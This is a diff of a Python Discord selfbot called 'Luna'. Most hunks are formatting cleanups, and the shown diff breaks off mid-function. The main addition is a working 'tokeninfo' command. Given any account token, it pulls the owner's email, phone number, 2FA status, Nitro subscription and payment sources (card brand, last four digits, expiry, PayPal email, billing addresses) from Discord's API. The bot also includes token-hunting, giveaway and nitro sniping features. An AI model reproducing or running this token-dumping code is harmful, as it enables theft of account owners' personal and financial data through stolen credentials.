@@ -3,7 +3,6 @@
 # ///////////////////////////////////////////////////////////////
 # Imports
 
-from lib2to3.pytree import Base
 import os
 import re
 import sys
@@ -218,7 +217,7 @@ class color:
                     green = 30
                     down = False
 
-                faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
+                faded += f"\033[38;2;{red};{green};{blue}m{character}\033[0m"
         return faded
 
     def purple_blue(text):
@@ -228,7 +227,7 @@ class color:
         green = 142
         blue = 255
         for line in text.splitlines():
-            faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
+            faded += f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n"
             if not green == 0:
                 green -= 5
                 if green < 0:
@@ -246,7 +245,7 @@ class color:
         green = 255
         blue = 255
         for line in text.splitlines():
-            faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
+            faded += f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n"
             if not red == 255:
                 red += 22
                 if red < 0:
@@ -482,7 +481,7 @@ def restart_program():
             documents=True) == "on" and files.json(
         "Luna/notifications/toasts.json",
         "toasts",
-            documents=True) == "on":
+        documents=True) == "on":
         notify.toast(message=f"Restarting Luna...")
     if files.json(
             "Luna/webhooks/webhooks.json",
@@ -490,7 +489,7 @@ def restart_program():
             documents=True) == "on" and files.json(
         "Luna/webhooks/webhooks.json",
         "webhooks",
-            documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
+        documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
         notify.webhook(url=webhook.login_url(), name="login",
                        description=f"Restarting Luna...")
     python = sys.executable
@@ -532,7 +531,7 @@ class luna:
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(message=f"Starting update {version_url}")
             if files.json(
                     "Luna/webhooks/webhooks.json",
@@ -540,7 +539,7 @@ class luna:
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
                 notify.webhook(url=webhook.login_url(), name="login",
                                description=f"Starting update {version_url}")
             luna.update()
@@ -750,7 +749,7 @@ class luna:
             for chunk in progress.bar(
                     r.iter_content(
                         chunk_size=1024), expected_size=(
-                        total_length / 1024) + 1):
+                                                                total_length / 1024) + 1):
                 if chunk:
                     f.write(chunk)
                     f.flush()
@@ -990,7 +989,7 @@ class luna:
         """
         tokens = luna.get_tokens()
         working_emails = []
-        if tokens == None:
+        if tokens is None:
             prints.message(
                 "Luna didn't find any valid tokens, please manually enter one instead")
             token = prints.input("Token")
@@ -1465,12 +1464,12 @@ class prints:
                 documents=True) and files.json(
             "Luna/console/console.json",
             "timestamp",
-                documents=True):
+            documents=True):
             spacer_1 = " " + \
                        files.json("Luna/console/console.json",
                                   "spacer", documents=True) + " "
         elif files.json("Luna/console/console.json", "spacers", documents=True) and files.json(
-                "Luna/console/console.json", "timestamp", documents=True) == False:
+                "Luna/console/console.json", "timestamp", documents=True) is False:
             spacer_1 = ""
         else:
             spacer_1 = " "
@@ -3182,7 +3181,7 @@ def update_thread():
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(message=f"Starting update {version_url}")
             if files.json(
                     "Luna/webhooks/webhooks.json",
@@ -3190,7 +3189,7 @@ def update_thread():
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
                 notify.webhook(url=webhook.login_url(), name="login",
                                description=f"Starting update {version_url}")
             update_found = True
@@ -3262,7 +3261,7 @@ async def on_ready():
             documents=True) == "on" and files.json(
         "Luna/notifications/toasts.json",
         "toasts",
-            documents=True) == "on":
+        documents=True) == "on":
         notify.toast(
             message=f"Logged into {bot.user}\nLuna Version » {version}")
     if files.json(
@@ -3271,7 +3270,7 @@ async def on_ready():
             documents=True) == "on" and files.json(
         "Luna/webhooks/webhooks.json",
         "webhooks",
-            documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
+        documents=True) == "on" and not webhook.login_url() == "webhook-url-here":
         notify.webhook(url=webhook.login_url(), name="login",
                        description=f"Logged into {bot.user}")
 
@@ -3456,7 +3455,7 @@ class OnMessage(commands.Cog, name="on message"):
                                 documents=True) == "on" and files.json(
                             "Luna/notifications/toasts.json",
                             "toasts",
-                                documents=True) == "on":
+                            documents=True) == "on":
                             notify.toast(
                                 message=f"{status}\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
                         if files.json(
@@ -3465,7 +3464,7 @@ class OnMessage(commands.Cog, name="on message"):
                                 documents=True) == "on" and files.json(
                             "Luna/webhooks/webhooks.json",
                             "webhooks",
-                                documents=True) == "on" and not webhook.nitro_url() == "webhook-url-here":
+                            documents=True) == "on" and not webhook.nitro_url() == "webhook-url-here":
                             notify.webhook(
                                 url=webhook.nitro_url(),
                                 name="nitro",
@@ -3516,7 +3515,7 @@ class OnMessage(commands.Cog, name="on message"):
                                 documents=True) == "on" and files.json(
                             "Luna/notifications/toasts.json",
                             "toasts",
-                                documents=True) == "on":
+                            documents=True) == "on":
                             notify.toast(
                                 message=f"{status}\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
                         if files.json(
@@ -3525,7 +3524,7 @@ class OnMessage(commands.Cog, name="on message"):
                                 documents=True) == "on" and files.json(
                             "Luna/webhooks/webhooks.json",
                             "webhooks",
-                                documents=True) == "on" and not webhook.nitro_url() == "webhook-url-here":
+                            documents=True) == "on" and not webhook.nitro_url() == "webhook-url-here":
                             notify.webhook(
                                 url=webhook.nitro_url(),
                                 name="nitro",
@@ -3566,11 +3565,11 @@ class OnMessage(commands.Cog, name="on message"):
             embeds = message.embeds
             for embed in embeds:
                 if ((("giveaway" in str(message.content).lower()) and (
-                    int(message.author.id) in custom_giveaway_bot_ids) and (
-                        "cancelled" not in str(message.content).lower()) and (
-                        "mention" not in str(message.content).lower()) and (
-                        "specify" not in str(message.content).lower()) and (
-                        "congratulations" not in str(message.content).lower())) and embed is not None):
+                        int(message.author.id) in custom_giveaway_bot_ids) and (
+                             "cancelled" not in str(message.content).lower()) and (
+                             "mention" not in str(message.content).lower()) and (
+                             "specify" not in str(message.content).lower()) and (
+                             "congratulations" not in str(message.content).lower())) and embed is not None):
                     found_something_blacklisted = 0
                     for blocked_word in giveaway_blocked_words:
                         if str(blocked_word).lower() in str(
@@ -3591,7 +3590,7 @@ class OnMessage(commands.Cog, name="on message"):
                                     documents=True) == "on" and files.json(
                                 "Luna/notifications/toasts.json",
                                 "toasts",
-                                    documents=True) == "on":
+                                documents=True) == "on":
                                 notify.toast(
                                     message=f"Skipped giveaway\nReason » {blocked_word}\nServer »  {message.guild}\nChannel » {message.channel}")
                             if files.json(
@@ -3600,7 +3599,7 @@ class OnMessage(commands.Cog, name="on message"):
                                     documents=True) == "on" and files.json(
                                 "Luna/webhooks/webhooks.json",
                                 "webhooks",
-                                    documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                                documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                                 notify.webhook(
                                     url=webhook.giveaway_url(),
                                     name="giveaway",
@@ -3630,7 +3629,7 @@ class OnMessage(commands.Cog, name="on message"):
                                                 documents=True) == "on" and files.json(
                                             "Luna/notifications/toasts.json",
                                             "toasts",
-                                                documents=True) == "on":
+                                            documents=True) == "on":
                                             notify.toast(
                                                 message=f"Skipped giveaway\nReason » {blocked_word}\nServer »  {message.guild}\nChannel » {message.channel}")
                                         if files.json(
@@ -3639,7 +3638,7 @@ class OnMessage(commands.Cog, name="on message"):
                                                 documents=True) == "on" and files.json(
                                             "Luna/webhooks/webhooks.json",
                                             "webhooks",
-                                                documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                                            documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                                             notify.webhook(
                                                 url=webhook.giveaway_url(),
                                                 name="giveaway",
@@ -3702,7 +3701,7 @@ class OnMessage(commands.Cog, name="on message"):
                                     documents=True) == "on" and files.json(
                                 "Luna/notifications/toasts.json",
                                 "toasts",
-                                    documents=True) == "on":
+                                documents=True) == "on":
                                 notify.toast(
                                     message=f"Giveaway found\nPrize » {giveaway_prize}\nServer »  {message.guild}\nChannel » {message.channel}")
                             if files.json(
@@ -3711,7 +3710,7 @@ class OnMessage(commands.Cog, name="on message"):
                                     documents=True) == "on" and files.json(
                                 "Luna/webhooks/webhooks.json",
                                 "webhooks",
-                                    documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                                documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                                 notify.webhook(
                                     url=webhook.giveaway_url(),
                                     name="giveaway",
@@ -3748,7 +3747,7 @@ class OnMessage(commands.Cog, name="on message"):
                                         documents=True) == "on" and files.json(
                                     "Luna/notifications/toasts.json",
                                     "toasts",
-                                        documents=True) == "on":
+                                    documents=True) == "on":
                                     notify.toast(
                                         message=f"Joined giveaway\nPrize » {giveaway_prize}\nServer »  {message.guild}\nChannel » {message.channel}")
                                 if files.json(
@@ -3757,7 +3756,7 @@ class OnMessage(commands.Cog, name="on message"):
                                         documents=True) == "on" and files.json(
                                     "Luna/webhooks/webhooks.json",
                                     "webhooks",
-                                        documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                                    documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                                     notify.webhook(
                                         url=webhook.giveaway_url(),
                                         name="giveaway",
@@ -3767,7 +3766,7 @@ class OnMessage(commands.Cog, name="on message"):
 
                 if '<@' + str(bot.user.id) + '>' in message.content and (
                         'giveaway' in str(message.content).lower() or ' won ' in message.content or ' winner ' in str(
-                            message.content).lower()) and message.author.bot and message.author.id in custom_giveaway_bot_ids:
+                    message.content).lower()) and message.author.bot and message.author.id in custom_giveaway_bot_ids:
                     print()
                     prints.sniper(f"{color.purple('Won giveaway')}")
                     prints.sniper(
@@ -3781,7 +3780,7 @@ class OnMessage(commands.Cog, name="on message"):
                             documents=True) == "on" and files.json(
                         "Luna/notifications/toasts.json",
                         "toasts",
-                            documents=True) == "on":
+                        documents=True) == "on":
                         notify.toast(
                             message=f"Won giveaway\nServer »  {message.guild}\nChannel » {message.channel}")
                     if files.json(
@@ -3790,7 +3789,7 @@ class OnMessage(commands.Cog, name="on message"):
                             documents=True) == "on" and files.json(
                         "Luna/webhooks/webhooks.json",
                         "webhooks",
-                            documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                        documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                         notify.webhook(
                             url=webhook.giveaway_url(),
                             name="giveaway",
@@ -3816,7 +3815,7 @@ class OnMessage(commands.Cog, name="on message"):
                                         documents=True) == "on" and files.json(
                                     "Luna/notifications/toasts.json",
                                     "toasts",
-                                        documents=True) == "on":
+                                    documents=True) == "on":
                                     notify.toast(
                                         message=f"Joined guild\nInvite » discord.gg/{code}")
                                 if files.json(
@@ -3825,7 +3824,7 @@ class OnMessage(commands.Cog, name="on message"):
                                         documents=True) == "on" and files.json(
                                     "Luna/webhooks/webhooks.json",
                                     "webhooks",
-                                        documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
+                                    documents=True) == "on" and not webhook.giveaway_url() == "webhook-url-here":
                                     notify.webhook(
                                         url=webhook.giveaway_url(),
                                         name="giveaway",
@@ -3904,7 +3903,7 @@ class OnMessage(commands.Cog, name="on message"):
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(
                     message=f"You have been mentioned\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
             if files.json(
@@ -3913,7 +3912,7 @@ class OnMessage(commands.Cog, name="on message"):
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.pings_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.pings_url() == "webhook-url-here":
                 notify.webhook(
                     url=webhook.pings_url(),
                     name="pings",
@@ -4000,7 +3999,7 @@ class OnMessage(commands.Cog, name="on message"):
                             url=theme.title_url(),
                             description="```\n\"Anti Invite\" is enabled, sending Discord invites is not allowed.```",
                             color=theme.hex_color())
-                        
+
                         embed.set_footer(text=theme.footer(),
                                          icon_url=theme.footer_icon_url())
                         embed.set_author(
@@ -4034,7 +4033,7 @@ class OnMessage(commands.Cog, name="on message"):
                             url=theme.title_url(),
                             description="```\n\"Anti Upper\" is enabled, sending all uppercase is not allowed.```",
                             color=theme.hex_color())
-                        
+
                         embed.set_footer(text=theme.footer(),
                                          icon_url=theme.footer_icon_url())
                         embed.set_author(
@@ -4066,7 +4065,7 @@ class OnMessage(commands.Cog, name="on message"):
                             url=theme.title_url(),
                             description="```\n\"Anti Phishing Links\" is enabled, the url you sent, is banned.```",
                             color=theme.hex_color())
-                        
+
                         embed.set_footer(text=theme.footer(),
                                          icon_url=theme.footer_icon_url())
                         embed.set_author(
@@ -4105,7 +4104,7 @@ class OnDelete(commands.Cog, name="on delete"):
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(
                     message=f"You have been ghostpinged\nServer »  {message.guild}\nChannel » {message.channel}\nAuthor »  {message.author}")
             if files.json(
@@ -4114,7 +4113,7 @@ class OnDelete(commands.Cog, name="on delete"):
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.ghostpings_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.ghostpings_url() == "webhook-url-here":
                 notify.webhook(
                     url=webhook.ghostpings_url(),
                     name="ghostpings",
@@ -4201,7 +4200,7 @@ class OnTyping(commands.Cog, name="on typing"):
                     documents=True) == "on" and files.json(
                 "Luna/notifications/toasts.json",
                 "toasts",
-                    documents=True) == "on":
+                documents=True) == "on":
                 notify.toast(message=f"{member} is typing")
             if files.json(
                     "Luna/webhooks/webhooks.json",
@@ -4209,7 +4208,7 @@ class OnTyping(commands.Cog, name="on typing"):
                     documents=True) == "on" and files.json(
                 "Luna/webhooks/webhooks.json",
                 "webhooks",
-                    documents=True) == "on" and not webhook.friendevents_url() == "webhook-url-here":
+                documents=True) == "on" and not webhook.friendevents_url() == "webhook-url-here":
                 notify.webhook(url=webhook.friendevents_url(
                 ), name="friendevents", description=f"{member} is typing")
 
@@ -4579,21 +4578,13 @@ Version\n\n{version}```")
         helptext = ""
         for command in commands:
             helptext += f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-        await message_builder(luna, title="Profile",
-                              description=f"{theme.description()}```\nCurrent profile\n\nUser              » {bot.user}\nUsername          » {bot.user.name}\nDiscriminator     » {bot.user.discriminator}\n``````\nNickname Control\n\n{prefix}nick <name>      » Change your nickname\n{prefix}invisiblenick    » Make your nickname invisible\n{prefix}junknick         » Pure junk nickname\n``````\nUser Control\n\n{helptext}```")
-
-    @commands.command(name="statuses",
-                      usage="",
-                      description="Animated statuses")
-    async def statuses(self, luna):
-        await luna.message.delete()
-        prefix = files.json("Luna/config.json", "prefix", documents=True)
-        cog = self.bot.get_cog('Status commands')
+        cog = self.bot.get_cog('Animated statuses')
         commands = cog.get_commands()
-        helptext = ""
+        status_helptext = ""
         for command in commands:
-            helptext += f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-        await message_builder(luna, title="Status", description=f"{theme.description()}```\n{helptext}```")
+            status_helptext += f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+        await message_builder(luna, title="Profile",
+                              description=f"{theme.description()}```\nCurrent profile\n\nUser              » {bot.user}\nUsername          » {bot.user.name}\nDiscriminator     » {bot.user.discriminator}\n``````\nNickname Control\n\n{prefix}nick <name>      » Change your nickname\n{prefix}invisiblenick    » Make your nickname invisible\n{prefix}junknick         » Pure junk nickname\n``````\nUser Control\n\n{helptext}``````\nStatus Control\n\n{status_helptext}```")
 
     @commands.command(name="animated",
                       usage="",
@@ -4689,7 +4680,7 @@ Version\n\n{version}```")
         embed = discord.Embed(
             title="Hentai Explorer",
             description=f"{theme.description()}```\n{helptext}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6154,7 +6145,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
                 title="Animguild",
                 description=f"```\nAnimating: {name}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -6185,7 +6176,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
                     title="Animguild",
                     description=f"```\nAnimating: {name}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -6227,7 +6218,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
         embed = discord.Embed(
             title="Animguild",
             description="```\nStopped the animation```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6240,7 +6231,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
         embed = discord.Embed(
             title="Cyclenick",
             description=f"```\nAnimating: {text}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6262,7 +6253,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
         embed = discord.Embed(
             title="Cyclenick",
             description="```\nStopped the animation```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6275,7 +6266,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
         embed = discord.Embed(
             title="Cyclegroup",
             description=f"```\nAnimating: {text}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6297,7 +6288,7 @@ class AnimatedCog(commands.Cog, name="Animated commands"):
         embed = discord.Embed(
             title="Cyclegroup",
             description="```\nStopped the animation```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6809,7 +6800,7 @@ class TextCog(commands.Cog, name="Text commands"):
             title="Encode Text",
             url=theme.title_url(),
             description=f"{theme.description()}```\n{helptext}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6831,7 +6822,7 @@ class TextCog(commands.Cog, name="Text commands"):
             title="Decode Text",
             url=theme.title_url(),
             description=f"{theme.description()}```\n{helptext}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -6868,7 +6859,7 @@ class TextCog(commands.Cog, name="Text commands"):
     async def indent_all(self, luna, *, text: str):
         await luna.message.delete()
         embed = discord.Embed(description=f"{text}")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -7211,7 +7202,7 @@ class ImageCog(commands.Cog, name="Image commands"):
             embed = discord.Embed(
                 description=f"```\nStole {member}'s avatar!```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -7242,7 +7233,7 @@ class ImageCog(commands.Cog, name="Image commands"):
             embed = discord.Embed(
                 description=f"```\nSet new avatar to »\n{url}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -7274,7 +7265,7 @@ class ImageCog(commands.Cog, name="Image commands"):
             embed = discord.Embed(
                 description=f"```\nSet your avatar to invisible```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -7595,7 +7586,7 @@ bot.add_cog(ImageCog(bot))
 class ImageCog2(commands.Cog, name="Image commands 2"):
     def __init__(self, bot: commands.bot):
         self.bot = bot
-        
+
     @commands.command(name="alert",
                       usage="<text>",
                       description="Iphone alert")
@@ -7695,7 +7686,7 @@ class ImageCog2(commands.Cog, name="Image commands 2"):
         embed = discord.Embed(title=theme.title(),
                               url=theme.title_url())
         embed.set_footer(text=theme.footer())
-        
+
         embed.set_image(
             url=f'https://api.no-api-key.com/api/v2/trash?image={str(user.display_avatar).replace(".webp", ".png")}')
         await send(luna, embed)
@@ -7873,7 +7864,7 @@ class TrollCog(commands.Cog, name="Troll commands"):
                 url=theme.title_url(),
                 description=f"Now copying {copycat}",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -7902,7 +7893,7 @@ class TrollCog(commands.Cog, name="Troll commands"):
                     url=theme.title_url(),
                     description=f"No one was getting copied",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -7925,7 +7916,7 @@ class TrollCog(commands.Cog, name="Troll commands"):
                 url=theme.title_url(),
                 description=f"Stopped copying {copycat}",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -8019,7 +8010,7 @@ class TrollCog(commands.Cog, name="Troll commands"):
         await message.edit(content='There it comes...')
         await asyncio.sleep(1)
         await message.edit(content='https://giphy.com/gifs/rick-roll-lgcUUCXgC8mEo')
-    
+
     @commands.command(name="banroulette",
                       usage="",
                       description="Ban roulette")
@@ -8036,7 +8027,6 @@ class TrollCog(commands.Cog, name="Troll commands"):
         except Exception as e:
             await error_builder(luna, e)
         await message_builder(luna, "Ban Roulette", f"{user} has been banned")
-    
 
 
 bot.add_cog(TrollCog(bot))
@@ -8177,7 +8167,7 @@ class FunCog(commands.Cog, name="Fun commands"):
         embed = discord.Embed(
             title=f"{user1} ❤️ {user2}",
             description=f"{number}% fitted!\n{kids}% chance of them having kids!\n{breakup}% chance of them breaking up!")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -8196,7 +8186,7 @@ class FunCog(commands.Cog, name="Fun commands"):
         embed = discord.Embed(
             title=f"{user}'s Corona Test",
             description=f'```\n{percent}% positive!\n``````\nResult\n\nOverall » {"Positive" if (percent > 50) else "Negative"}```')
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
@@ -8427,7 +8417,7 @@ class ToolsCog(commands.Cog, name="Tools commands"):
                 url=theme.title_url(),
                 description=f"```\nCreated note » {name}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -8462,7 +8452,7 @@ class ToolsCog(commands.Cog, name="Tools commands"):
                 url=theme.title_url(),
                 description=f"```\nEdited \"note\" {name} to » {themename}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -8486,7 +8476,7 @@ class ToolsCog(commands.Cog, name="Tools commands"):
                 url=theme.title_url(),
                 description=f"```\nDeleted note » {name}```",
                 color=theme.hex_color())
-            
+
             embed.set_footer(text=theme.footer(),
                              icon_url=theme.footer_icon_url())
             embed.set_author(name=theme.author(), url=theme.author_url(
@@ -8542,7 +8532,7 @@ class ToolsCog(commands.Cog, name="Tools commands"):
                     title="Notes",
                     description=f"```\nContent of {name}.txt ↴\n\n{str(file_data)}```",
                     color=theme.hex_color())
-                
+
                 embed.set_footer(text=theme.footer(),
                                  icon_url=theme.footer_icon_url())
                 embed.set_author(name=theme.author(), url=theme.author_url(
@@ -8580,10 +8570,174 @@ class ToolsCog(commands.Cog, name="Tools commands"):
         embed = discord.Embed(
             title="Notes",
             description=f"{theme.description()}```\nNote control\n\n{prefix}note <name> <text> » Create a note\n{prefix}editnote <name> <name> » Edit note name\n{prefix}delnote <name>   » Delete a note\n{prefix}sendnote <name>  » Send the note\n``````\nAvailable notes\n\n{stringedit}```")
-        
+
         embed.set_footer(text=theme.footer())
 
         await send(luna, embed)
+
+    @commands.command(name="tokeninfo",
+                      usage="<token>",
+                      description="Check the token for information")
+    async def tokeninfo(self, luna, token: str):
+        await luna.message.delete()
+        headers = {"Authorization": token, "Content-Type": "application/json"}
+        res = requests.get(f"https://discordapp.com/api/{api_version}/users/@me", headers=headers)
+        cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
+        languages = {
+            "da": "Danish, Denmark",
+            "de": "German, Germany",
+            "en-GB": "English, United Kingdom",
+            "en-US": "English, United States",
+            "es-ES": "Spanish, Spain",
+            "fr": "French, France",
+            "hr": "Croatian, Croatia",
+            "lt": "Lithuanian, Lithuania",
+            "hu": "Hungarian, Hungary",
+            "nl": "Dutch, Netherlands",
+            "no": "Norwegian, Norway",
+            "pl": "Polish, Poland",
+            "pt-BR": "Portuguese, Brazilian, Brazil",
+            "ro": "Romanian, Romania",
+            "fi": "Finnish, Finland",
+            "sv-SE": "Swedish, Sweden",
+            "vi": "Vietnamese, Vietnam",
+            "tr": "Turkish, Turkey",
+            "cs": "Czech, Czechia, Czech Republic",
+            "el": "Greek, Greece",
+            "bg": "Bulgarian, Bulgaria",
+            "ru": "Russian, Russia",
+            "uk": "Ukranian, Ukraine",
+            "th": "Thai, Thailand",
+            "zh-CN": "Chinese, China",
+            "ja": "Japanese",
+            "zh-TW": "Chinese, Taiwan",
+            "ko": "Korean, Korea",
+        }
+        if res.status_code == 200:
+            res_json = res.json()
+            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+            user_id = res_json["id"]
+            avatar_id = res_json["avatar"]
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif"
+            phone_number = res_json["phone"]
+            email = res_json["email"]
+            mfa_enabled = res_json["mfa_enabled"]
+            flags = res_json["flags"]
+            locale = res_json["locale"]
+            verified = res_json["verified"]
+            language = languages.get(locale)
+            creation_date = datetime.fromtimestamp(
+                ((int(user_id) >> 22) + 1420070400000) / 1000
+            ).strftime("%d-%m-%Y %H:%M:%S")
+            has_nitro = False
+            res = requests.get(
+                "https://discordapp.com/api/v6/users/@me/billing/subscriptions",
+                headers=headers,
+            )
+            nitro_data = res.json()
+            has_nitro = bool(len(nitro_data) > 0)
+            if has_nitro:
+                d1 = datetime.strptime(
+                    nitro_data[0]["current_period_end"].split(".")[0],
+                    "%Y-%m-%dT%H:%M:%S",
+                )
+                d2 = datetime.strptime(
+                    nitro_data[0]["current_period_start"].split(".")[0],
+                    "%Y-%m-%dT%H:%M:%S",
+                )
+                days_left = abs((d2 - d1).days)
+            billing_info = []
+            for x in requests.get(
+                    "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                    headers=headers,
+            ).json():
+                y = x["billing_address"]
+                name = y["name"]
+                address_1 = y["line_1"]
+                address_2 = y["line_2"]
+                city = y["city"]
+                postal_code = y["postal_code"]
+                state = y["state"]
+                country = y["country"]
+                if x["type"] == 1:
+                    cc_brand = x["brand"]
+                    cc_first = cc_digits.get(cc_brand)
+                    cc_last = x["last_4"]
+                    cc_month = str(x["expires_month"])
+                    cc_year = str(x["expires_year"])
+                    data = {
+                        "Payment Type": "Credit Card",
+                        "Valid": not x["invalid"],
+                        "CC Holder Name": name,
+                        "CC Brand": cc_brand.title(),
+                        "CC Number": "".join(
+                            z if (i + 1) % 2 else z + " "
+                            for i, z in enumerate(
+                                (cc_first if cc_first else "*") + ("*" * 11) + cc_last
+                            )
+                        ),
+                        "CC Exp. Date": (
+                                            "0" + cc_month if len(cc_month) < 2 else cc_month
+                                        )
+                                        + "/"
+                                        + cc_year[2:4],
+                        "Address 1": address_1,
+                        "Address 2": address_2 if address_2 else "",
+                        "City": city,
+                        "Postal Code": postal_code,
+                        "State": state if state else "",
+                        "Country": country,
+                        "Default Payment Method": x["default"],
+                    }
+                elif x["type"] == 2:
+                    data = {
+                        "Payment Type": "PayPal",
+                        "Valid": not x["invalid"],
+                        "PayPal Name": name,
+                        "PayPal Email": x["email"],
+                        "Address 1": address_1,
+                        "Address 2": address_2 if address_2 else "",
+                        "City": city,
+                        "Postal Code": postal_code,
+                        "State": state if state else "",
+                        "Country": country,
+                        "Default Payment Method": x["default"],
+                    }
+                billing_info.append(data)
+            helptext = "```\nUser Information\n\n"
+            helptext += f"Username: {user_name}\n"
+            helptext += f"User ID: {user_id}\n"
+            helptext += f"Creation Date: {creation_date}\n"
+            helptext += f'Avatar URL: {avatar_url if avatar_id else "None"}\n'
+            helptext += f"Token: {token}\n"
+            helptext += f"Nitro Status: {has_nitro}\n"
+            if has_nitro:
+                helptext += f"Expires in: {days_left} day(s)\n"
+            helptext += f"2FA: {mfa_enabled}\n"
+            helptext += f"Flags: {flags}\n"
+            helptext += f"Locale: {locale} ({language})\n"
+            helptext += f"Email Verified: {verified}\n"
+            helptext += f'Email: {email if email else ""}\n'
+            helptext += f'Phone Number: {phone_number if phone_number else "None"}\n```'
+            if len(billing_info) > 0:
+                helptext += "```\nBilling Information\n\n"
+                if len(billing_info) == 1:
+                    for x in billing_info:
+                        for key, val in x.items():
+                            if not val:
+                                continue
+                            helptext += "{:<23}{}\n".format(key, val)
+                else:
+                    for i, x in enumerate(billing_info):
+                        helptext += f'```\nPayment Method #{i + 1} ({x["Payment Type"]})\n'
